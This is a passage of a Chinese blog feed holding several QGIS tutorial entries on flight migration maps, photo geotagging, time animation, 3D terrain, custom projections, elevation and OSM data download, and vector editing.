        <content type="html"><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a><strong>实验目的</strong></h1><p>迁徙图的制作以它特使的可视化形式，直观地展示事务之间的联系，尤其在展示网络流向、贸易流向、迁徙路线等方面具有天然的优势，本专题以国内航班数据为基础，以北京市为例，制作流向北京的航空迁徙图。旨在掌握【xy to line】工具的使用、符号化设计、图层渲染效果以及如何在QGIS中添加底图。</p><h1 id="数据要求"><a href="#数据要求" class="headerlink" title="数据要求"></a>数据要求</h1><p>国内航班数据.csv</p><h1 id="实验思路"><a href="#实验思路" class="headerlink" title="实验思路"></a>实验思路</h1><ol><li><p><strong>实验思路流程图</strong></p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E8%BF%81%E5%BE%99%E5%9B%BE%E5%88%B6%E4%BD%9C/1.png" alt></p></li><li><p><strong>分析工具</strong></p><p>添加文本数据：【图层】|【添加图层】|【添加文本数据图层】；</p><p>点到线：【shape Tools】| 【点构造线条】（xy to line）；</p><p>添加底图：【HCMGIS】插件或者【QuickMapServises】插件</p></li></ol><h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><h2 id="添加数据"><a href="#添加数据" class="headerlink" title="添加数据"></a>添加数据</h2><ol><li><p>【图层】|【添加图层】|【添加文本数据图层】</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E8%BF%81%E5%BE%99%E5%9B%BE%E5%88%B6%E4%BD%9C/2.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E8%BF%81%E5%BE%99%E5%9B%BE%E5%88%B6%E4%BD%9C/3.png" alt></p></li><li><p>加载国内主要城市的航班数据</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E8%BF%81%E5%BE%99%E5%9B%BE%E5%88%B6%E4%BD%9C/4.png" alt></p></li><li><p>打开属性表检查</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E8%BF%81%E5%BE%99%E5%9B%BE%E5%88%B6%E4%BD%9C/5.png" alt></p></li><li><p><strong>xy to line工具使用</strong></p><ol><li><p>下载插件【shape Tools】| 打开【点构造线条】（xy to line）工具；</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E8%BF%81%E5%BE%99%E5%9B%BE%E5%88%B6%E4%BD%9C/6.png" alt></p></li><li><p>设置参数，设置开始点坐标和终止点坐标，其他默认；</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E8%BF%81%E5%BE%99%E5%9B%BE%E5%88%B6%E4%BD%9C/7.png" alt></p></li></ol></li><li><p>运行完成后，即可看到对应的效果；</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E8%BF%81%E5%BE%99%E5%9B%BE%E5%88%B6%E4%BD%9C/8.png" alt></p></li><li><p>在图层上右键打开属性表 | 利用【按值选择属性】工具选出出发地为北京的数据 |<br>在图层右键【导出】|【另存选中的要素为】 </p></li><li><p>符号化</p><p>参数设置如下：</p><ul><li><p>设置颜色为玫红；</p></li><li><p>宽度为0.06；</p></li><li><p>在【图层渲染】效果设置为【加】多条线路区域会加亮</p></li></ul></li></ol><h2 id="添加底图"><a href="#添加底图" class="headerlink" title="添加底图"></a>添加底图</h2><p>方法一：添加【HCMGIS】插件，里面有多个底图可添加；</p><p>方法二：添加【QuickMapServises】插件，也有底图可添加；</p><p>选择满意的底图进行修饰</p><h1 id="成果展示"><a href="#成果展示" class="headerlink" title="成果展示"></a>成果展示</h1><p><strong>北京市航空数据的迁徙图</strong></p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E8%BF%81%E5%BE%99%E5%9B%BE%E5%88%B6%E4%BD%9C/9.png" alt></p><p>由成果图可以看出，各个航班点到北京所在的航班迁徙的数量以及去向。通过航班迁徙图能够直观地确定航班出发点和到达点的去向，采用创新的可视化呈现方式，实现国内航班迁徙的轨迹与特征，极具美观的同时准确传达信息，是在新时代流行的可视化方式。</p>]]></content>
      
      
      <categories>
          
          <category> QGIS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GIS </tag>
            
            <tag> QGIS入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QGIS照片上图</title>
      <link href="/2020/07/29/QGIS/QGIS%E7%85%A7%E7%89%87%E4%B8%8A%E5%9B%BE/"/>
      <url>/2020/07/29/QGIS/QGIS%E7%85%A7%E7%89%87%E4%B8%8A%E5%9B%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><p>有时候我们去野外调研或者外出旅游时，会拍摄很多照片，这些照片能不能根据当时拍摄的位置在地图上重现呢？QGIS有个【ImportPhotos】插件可以实现这个功能，使我们能更好的知道实时的所在的位置。</p><h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><ol><li><p><strong>下载插件</strong></p><p>下载【插件】|【管理并安装插件】| 搜索插件【ImportPhotos】</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E7%85%A7%E7%89%87%E4%B8%8A%E5%9B%BE/1.png" alt></p></li><li><p><strong>加载照片</strong></p><p>安装完毕后，在工具栏上会新增2个功能图标，点击【插件】|【ImportPhotos】|<br>弹出照片导入对话框，在对话框中选择照片存储的位置，以及有信息数据的图片，点击OK即可（注意：数据路径最好不要有中文）</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E7%85%A7%E7%89%87%E4%B8%8A%E5%9B%BE/2.png" alt></p><p>等一会后，会提示你几张照片添加成功，有些照片因为缺少坐标信息会导入失败</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E7%85%A7%E7%89%87%E4%B8%8A%E5%9B%BE/3.png" alt></p><p>可以看到成功的记账照片已经加载到地图中了，在所加载的图片中右键【打开属性表】检查一下，可以看到照片拍摄的日期、手机型号、经纬度、方位等信息</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E7%85%A7%E7%89%87%E4%B8%8A%E5%9B%BE/4.png" alt></p></li><li><p><strong>预览结果</strong></p><p>在工具栏上新加载的插件点击如图所示的图标，然后点击地图上的图片，然后就可以看到照片放大的效果</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E7%85%A7%E7%89%87%E4%B8%8A%E5%9B%BE/5.png" alt></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> QGIS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GIS </tag>
            
            <tag> QGIS入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QGIS动态展示</title>
      <link href="/2020/07/29/QGIS/QGIS%E5%8A%A8%E6%80%81%E5%B1%95%E7%A4%BA/"/>
      <url>/2020/07/29/QGIS/QGIS%E5%8A%A8%E6%80%81%E5%B1%95%E7%A4%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h1><p>1.掌握矢量图层的添加；</p><p>2.掌握【Time manager】工具的使用；</p><p>3.掌握符号化设计、图层渲染效果的使用；</p><p>4.掌握在QGIS中添加底图。</p><h1 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h1><p>GPS动态数据.GPX</p><h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><h2 id="添加数据"><a href="#添加数据" class="headerlink" title="添加数据"></a>添加数据</h2><p>在QGIS中通过【添加矢量图层】功能，加载GPX文件，一个GPX文件包含多个图层，有用的一般只有两个track_points和tracks，然后点击OK，为了后续便于操作，为数据添加名字如轨迹点和轨迹线；</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E5%8A%A8%E6%80%81%E5%B1%95%E7%A4%BA/1.png" alt></p><h2 id="可视化"><a href="#可视化" class="headerlink" title="可视化"></a>可视化</h2><p>将轨迹点设置为热力图，设置相应的图层样式属性；</p><h2 id="加载【Time-manager】插件、添加底图"><a href="#加载【Time-manager】插件、添加底图" class="headerlink" title="加载【Time manager】插件、添加底图"></a>加载【Time manager】插件、添加底图</h2><ol><li><p>通过插件面板中搜索【Time manager】继续进行安装，启动【Time manager】插件猴；</p></li><li><p>底部展示操作面板，通过【setting】按钮对数据进行设置，在弹出的对话框中点击【AddLayer】功能选择要设置的图层，然后选择作为开始时间的字段，其他默认；</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E5%8A%A8%E6%80%81%E5%B1%95%E7%A4%BA/2.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E5%8A%A8%E6%80%81%E5%B1%95%E7%A4%BA/3.png" alt></p></li><li><p>点击播放按钮，数据便会自动进行播放，实现动态展示效果。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> QGIS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GIS </tag>
            
            <tag> QGIS入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QGIS三维效果</title>
      <link href="/2020/07/29/QGIS/QGIS%E4%B8%89%E7%BB%B4%E6%95%88%E6%9E%9C/"/>
      <url>/2020/07/29/QGIS/QGIS%E4%B8%89%E7%BB%B4%E6%95%88%E6%9E%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><p>在QGIS中可以用时看到二维和三维效果，本实验将掌握QGIS三维效果的呈现，利用插件【Qgis2threejs】插件实现三维化以此来适应很多数据的多样性呈现。</p><h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><ol><li><p><strong>下载插件</strong></p><p>利用菜单栏上的【插件】|【管理并安装插件】下载【Qgis2threejs】插件</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E4%B8%89%E7%BB%B4%E6%95%88%E6%9E%9C/1.png" alt></p></li><li><p><strong>三维显示</strong></p><p>将导入的DEM数据进行符号化，选择【单波段伪彩色】并为了符合实际进行反转颜色</p><p>然后进行投影，打开【项目】|【项目属性】将投影坐标系选择WGS 84/UTM zone 50N</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E4%B8%89%E7%BB%B4%E6%95%88%E6%9E%9C/2.png" alt></p><p>将DEM数据晕渲化后点击【插件】|【Qgis2threejs】|【Qgis2threejs】</p><p>出现三维界面，可以根据【Scene】|【Scene Settings】将【Vertical exaggeration】（垂直夸张指数）更改为20</p><p>菜单栏的提示进行设置参数属性等</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E4%B8%89%E7%BB%B4%E6%95%88%E6%9E%9C/3.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E4%B8%89%E7%BB%B4%E6%95%88%E6%9E%9C/4.png" alt></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> QGIS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GIS </tag>
            
            <tag> QGIS入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QGIS自定义工程坐标系</title>
      <link href="/2020/07/29/QGIS/QGIS%E8%87%AA%E5%AE%9A%E4%B9%89%E5%B7%A5%E7%A8%8B%E5%9D%90%E6%A0%87%E7%B3%BB/"/>
      <url>/2020/07/29/QGIS/QGIS%E8%87%AA%E5%AE%9A%E4%B9%89%E5%B7%A5%E7%A8%8B%E5%9D%90%E6%A0%87%E7%B3%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><p>掌握工程坐标系的自定义建立，在不同专题下让地图呈现出不一样的视觉冲击效果。</p><h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><ol><li><p>坐标系参数</p><p>不同的坐标系呈现出不一样的效果</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E8%87%AA%E5%AE%9A%E4%B9%89%E5%B7%A5%E7%A8%8B%E5%9D%90%E6%A0%87%E7%B3%BB/1.png" alt></p><p>可以在 <a href="http://projectionwizard.org/" target="_blank" rel="noopener">http://projectionwizard.org/</a> 中查找你要的坐标系，可以直接复制相关参数</p><p>根据复制的参数直接点击+号创建一个坐标参照系即可</p><p>有时候需要对参数进行调整，比如标准的割圆锥的位置是在25度和47度的位置，中央经线是105</p></li><li><p>自定义坐标系</p><p>利用【设置】|【自定义投影】打开【自定义坐标参考系】对话框</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E8%87%AA%E5%AE%9A%E4%B9%89%E5%B7%A5%E7%A8%8B%E5%9D%90%E6%A0%87%E7%B3%BB/2.png" alt></p><p>自定义完毕后，直接为工程设置该坐标参考即可，由2种方式弹出对话框</p></li><li><p>点击状态栏上的ESPG编码位置</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E8%87%AA%E5%AE%9A%E4%B9%89%E5%B7%A5%E7%A8%8B%E5%9D%90%E6%A0%87%E7%B3%BB/3.png" alt></p></li><li><p>在【项目】菜单中选择【属性】，弹出项目属性面板，切换至坐标参照系页面</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E8%87%AA%E5%AE%9A%E4%B9%89%E5%B7%A5%E7%A8%8B%E5%9D%90%E6%A0%87%E7%B3%BB/4.png" alt></p><p>选择自定义的坐标系统，点击OK即可</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E8%87%AA%E5%AE%9A%E4%B9%89%E5%B7%A5%E7%A8%8B%E5%9D%90%E6%A0%87%E7%B3%BB/5.png" alt></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> QGIS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GIS </tag>
            
            <tag> QGIS入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QGIS高程栅格数据</title>
      <link href="/2020/07/29/QGIS/QGIS%E9%AB%98%E7%A8%8B%E6%A0%85%E6%A0%BC%E6%95%B0%E6%8D%AE/"/>
      <url>/2020/07/29/QGIS/QGIS%E9%AB%98%E7%A8%8B%E6%A0%85%E6%A0%BC%E6%95%B0%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><p>掌握高程栅格数据在QGIS中直接下载的方法，以及栅格数据的处理，包括拼接和裁剪。</p><h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><ol><li><p><strong>下载插件</strong></p><p>在菜单栏上【插件】|【管理并安装插件】即可下载插件【SRTM-Downloader】</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E9%AB%98%E7%A8%8B%E6%A0%85%E6%A0%BC%E6%95%B0%E6%8D%AE/1.png" alt></p></li><li><p><strong>下载高程数据</strong></p><p>点击菜单栏上【插件】|【SRTM-Downloader】|【SRTM-Downloader】</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E9%AB%98%E7%A8%8B%E6%A0%85%E6%A0%BC%E6%95%B0%E6%8D%AE/2.png" alt></p><p>导入你要加载高程的矢量数据（这里由于山东省太大，只用其中的莱芜市做例子）</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E9%AB%98%E7%A8%8B%E6%A0%85%E6%A0%BC%E6%95%B0%E6%8D%AE/3.png" alt></p><p>设置参数：先确定范围，再选择存放路径，最后点击下载</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E9%AB%98%E7%A8%8B%E6%A0%85%E6%A0%BC%E6%95%B0%E6%8D%AE/4.png" alt></p><p>下载前需要登录地球数据的用户名和密码，若之前没有注册过，点击给的官网按照提示进行注册再登录即可</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E9%AB%98%E7%A8%8B%E6%A0%85%E6%A0%BC%E6%95%B0%E6%8D%AE/5.png" alt></p></li><li><p><strong>拼接栅格数据</strong></p><p>下载到的高程数据是一块一块的，需要我们进行合并成一块</p><p>利用菜单栏上【栅格】|【杂项】|【合并】</p><p>选择要合并的图层以及输出路径然后点击运行即可</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E9%AB%98%E7%A8%8B%E6%A0%85%E6%A0%BC%E6%95%B0%E6%8D%AE/6.png" alt></p></li><li><p><strong>裁剪栅格数据</strong></p><p>然后我们需要按照莱芜市要素对栅格数据进行裁剪</p><p>利用【栅格】|【提取】|【按掩膜图层裁剪栅格】设置相应参数运行即可</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E9%AB%98%E7%A8%8B%E6%A0%85%E6%A0%BC%E6%95%B0%E6%8D%AE/7.png" alt></p></li><li><p><strong>符号化</strong></p><p>可以对高程栅格数据进行晕渲可视化</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E9%AB%98%E7%A8%8B%E6%A0%85%E6%A0%BC%E6%95%B0%E6%8D%AE/8.png" alt></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> QGIS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GIS </tag>
            
            <tag> QGIS入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QGIS矢量数据下载</title>
      <link href="/2020/07/29/QGIS/QGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E4%B8%8B%E8%BD%BD/"/>
      <url>/2020/07/29/QGIS/QGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E4%B8%8B%E8%BD%BD/</url>
      
        <content type="html"><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><p>如果不想手动创建矢量数据，有什么办法可以下载免费的数据呢？这节实验将介绍QGIS中矢量数据的下载，比较简单，主要是利用OSMDownloader插件，不过小技巧很好用。</p><h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><p>安装插件【OSMDownloader】</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E4%B8%8B%E8%BD%BD/1.png" alt></p><p>加载一个底图让我们利用【OSMDownloader】进行矢量化</p><p>点击如图所示的按钮，选择一块你要的数据（这个是范围越大的话，处理的时间就越长）</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E4%B8%8B%E8%BD%BD/2.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E4%B8%8B%E8%BD%BD/3.png" alt></p><p>下载完成后，会出现一个数据选择面板，选择你要的，然后点击OK</p><p>选择的数据会自动的加载到窗口中</p><p>打开属性表来看看</p>]]></content>
      
      
      <categories>
          
          <category> QGIS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GIS </tag>
            
            <tag> QGIS入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QGIS矢量数据属性编辑</title>
      <link href="/2020/07/29/QGIS/QGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%B1%9E%E6%80%A7%E7%BC%96%E8%BE%91/"/>
      <url>/2020/07/29/QGIS/QGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%B1%9E%E6%80%A7%E7%BC%96%E8%BE%91/</url>
      
        <content type="html"><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><p>通过这个实验我们可以掌握：</p><ul><li><p>属性字段的增加、删除、更改</p></li><li><p>属性字段的拼接和拆分（利用HCMGIS插件）</p></li></ul><h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><ol><li><p><strong>添加字段</strong></p><p>在图层右键【打开属性表】在菜单栏上点击【添加字段】设置字段名、字段类型及长度参数</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%B1%9E%E6%80%A7%E7%BC%96%E8%BE%91/1.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%B1%9E%E6%80%A7%E7%BC%96%E8%BE%91/2.png" alt></p></li><li><p><strong>编辑字段</strong></p><p>在菜单栏上切换编辑状态，进行编辑后，点击【保存编辑】即可</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%B1%9E%E6%80%A7%E7%BC%96%E8%BE%91/3.png" alt></p><p>还可以通过【字段计算器】进行批量快速的编辑属性表</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%B1%9E%E6%80%A7%E7%BC%96%E8%BE%91/4.png" alt></p></li><li><p><strong>删除字段</strong></p><p>在菜单栏上点击【删除字段】选择要删除的字段进行删除即可</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%B1%9E%E6%80%A7%E7%BC%96%E8%BE%91/5.png" alt></p></li><li><p><strong>拼接字段</strong></p><p>在菜单栏上插件【HCMGIS】|【Calculate Field】|【Merge Fields】设置要拼接的字段以及拼接符即可</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%B1%9E%E6%80%A7%E7%BC%96%E8%BE%91/6.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%B1%9E%E6%80%A7%E7%BC%96%E8%BE%91/7.png" alt></p></li><li><p><strong>拆分字段</strong></p><p>在菜单栏上插件【HCMGIS】|【Calculate Field】|【Split Fields】设置要拆分的字段以及拆分符即可</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE%E5%B1%9E%E6%80%A7%E7%BC%96%E8%BE%91/8.png" alt></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> QGIS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GIS </tag>
            
            <tag> QGIS入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QGIS创建矢量数据</title>
      <link href="/2020/07/29/QGIS/QGIS%E5%88%9B%E5%BB%BA%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE/"/>
      <url>/2020/07/29/QGIS/QGIS%E5%88%9B%E5%BB%BA%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><p>在QGIS中可以创建Geopackage（虚拟）、shapefile、SpatialLite、临时草稿四种类型的图层要素，不同类别所支持创建的种类也不尽相同，下面以最为通用的shapefile格式的图层为例，介绍如何创建点、线、面要素。</p><h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><ol><li><p><strong>新建shapefile图层</strong></p><p>在菜单栏选择创建shapefile图层</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E5%88%9B%E5%BB%BA%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE/1.png" alt></p></li><li><p><strong>创建点要素</strong></p><p>选择数据存储位置及名称、几何图形类型以及根据需要创建字段</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E5%88%9B%E5%BB%BA%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE/2.png" alt></p><p>进行图层编辑前，先切换编辑状态，有两种</p><ul><li><p>第一种是在菜单栏上切换编辑状态</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E5%88%9B%E5%BB%BA%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE/3.png" alt></p></li><li><p>第二种是在要编辑的图层上右键【切换编辑状态】</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E5%88%9B%E5%BB%BA%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE/4.png" alt></p></li></ul><p>在菜单栏上找到【添加点要素】工具，添加一个底图方便我们对比添加要素</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E5%88%9B%E5%BB%BA%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE/5.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E5%88%9B%E5%BB%BA%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE/6.png" alt></p></li><li><p><strong>创建线要素</strong></p><p>在shapefile文件上右键单击【新建】|【shapefile】然后选择几何图形类型为线即可</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E5%88%9B%E5%BB%BA%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE/7.png" alt></p></li><li><p><strong>创建面要素</strong></p><p>与上面一致，将几何图形类型改为面即可</p></li><li><p><strong>编辑要素</strong></p><p>首先在菜单栏空白处右键调出【高级数字化工具栏】</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E5%88%9B%E5%BB%BA%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE/8.png" alt></p></li><li><p><strong>移动要素</strong></p><p>由于手滑出现的点位置错误等，可以通过【移动要素】工具进行修改</p><p>第一次点中要修改的要素</p><p>第二次点击要移动要素的位置即可</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E5%88%9B%E5%BB%BA%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE/9.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E5%88%9B%E5%BB%BA%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE/10.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E5%88%9B%E5%BB%BA%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE/11.png" alt></p></li><li><p><strong>旋转要素</strong></p><p>如果发现数据位置不合适，除了可以移动，还可以机型旋转操作，利用【旋转要素】手动拖动要素旋转，也可以直接输入具体数值进行旋转</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E5%88%9B%E5%BB%BA%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE/12.png" alt></p></li><li><p><strong>简化要素</strong></p><p>针对复杂的要素，可以进行要素简化操作</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E5%88%9B%E5%BB%BA%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE/13.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E5%88%9B%E5%BB%BA%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE/14.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E5%88%9B%E5%BB%BA%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE/15.png" alt></p></li><li><p><strong>添加、填充、删除环</strong></p><p>对于一些特殊的场景，需要用到添加、填充、删除环的工具</p></li><li><p><strong>重塑要素</strong></p><p>基于现有的要素上做修改，可以利用【重塑要素】工具</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E5%88%9B%E5%BB%BA%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE/16.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E5%88%9B%E5%BB%BA%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE/17.png" alt></p></li><li><p><strong>偏移曲线</strong></p><p>如果当前要素尺寸不合适，可以使用【偏移曲线】来缩放要素</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E5%88%9B%E5%BB%BA%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE/18.png" alt></p></li><li><p><strong>裁剪、分割要素</strong></p><p>如果编辑出现错误，要对现有要素进行裁剪、分割等，可以利用【裁剪要素】【分割要素】</p></li><li><p><strong>添加标注及符号化</strong></p><p>在要添加标注的图层上右键【打开属性表】|【添加字段】设置字段名及类型、长度</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E5%88%9B%E5%BB%BA%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE/19.png" alt></p><p>编辑属性表前线切换编辑状态，然后编辑完进行保存</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E5%88%9B%E5%BB%BA%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE/20.png" alt></p><p>在图层右键【属性】|【标签】根据列表框所给的格式进行设计标注</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E5%88%9B%E5%BB%BA%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE/21.png" alt></p><p>点要素标注结果如下：</p><p><img src= "/img/loading.gif" 